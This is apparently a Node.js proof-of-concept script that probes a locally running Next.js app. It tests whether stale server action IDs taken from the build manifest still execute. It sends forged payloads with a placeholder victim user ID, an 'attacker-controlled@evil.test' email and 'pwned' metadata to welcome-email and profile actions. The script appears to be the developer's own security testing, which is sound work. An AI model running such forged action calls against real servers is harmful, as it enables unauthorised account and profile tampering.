#!/usr/bin/env node
/** Probe whether stale maybeSendWelcomeEmail action id still executes on the running server. */

import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const manifest = JSON.parse(
  fs.readFileSync(path.join(root, '.next/server/server-reference-manifest.json'), 'utf8')
)

function findId(name) {
  return Object.entries(manifest.node || {}).find(
    ([, v]) => v.exportedName === name
  )?.[0]
}

const welcomeId = findId('maybeSendWelcomeEmail')
const ensureId = findId('ensureUserProfile')
const signOutId = findId('signOut')
const fakeId = 'ffffffffffffffffffffffffffffffffffffffff'

async function invoke(label, actionId, body) {
  const res = await fetch('http://127.0.0.1:3000/', {
    method: 'POST',
    headers: {
      'Next-Action': actionId,
      'Content-Type': 'text/plain;charset=UTF-8',
      Accept: 'text/x-component',
    },
    body: JSON.stringify(body),
  })
  const text = await res.text()
  console.log(`\n=== ${label} ===`)
  console.log('id:', actionId?.slice(0, 20) + '…')
  console.log('status:', res.status)
  console.log('x-action-revalidated:', res.headers.get('x-action-revalidated'))
  console.log('content-type:', res.headers.get('content-type'))
  console.log('body:', text.slice(0, 500))
  return { status: res.status, text, headers: Object.fromEntries(res.headers) }
}

console.log('welcomeId present:', Boolean(welcomeId))
console.log('ensureId present:', Boolean(ensureId))

// Baseline: completely fake action id
await invoke('FAKE action id', fakeId, [{ id: 'x' }])

// Known real action (signOut) — should at least be recognized
if (signOutId) {
  await invoke('signOut (real)', signOutId, [])
}

// Stale welcome action with victim payload
if (welcomeId) {
  await invoke('maybeSendWelcomeEmail stale', welcomeId, [
    {
      id: 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb',
      email: 'attacker-controlled@evil.test',
      user_metadata: { welcome_email_sent: false, pwned: true },
    },
    'Forced Name',
  ])
}

if (ensureId) {
  await invoke('ensureUserProfile stale', ensureId, [
    {
      id: 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb',
      email: 'attacker-controlled@evil.test',
      user_metadata: { name: 'Pwned' },
    },
  ])
}

// Also try getClientGallery by scanning source-mapped action names from app router
const all = Object.entries(manifest.node || {}).map(([id, v]) => ({
  id,
  name: v.exportedName,
}))
console.log(
  '\nAll action names containing Gallery/cleanup/Welcome/ensure:',
  all.filter((a) => /Gallery|cleanup|Welcome|ensureUser/i.test(a.name || '')).map((a) => a.name)
)
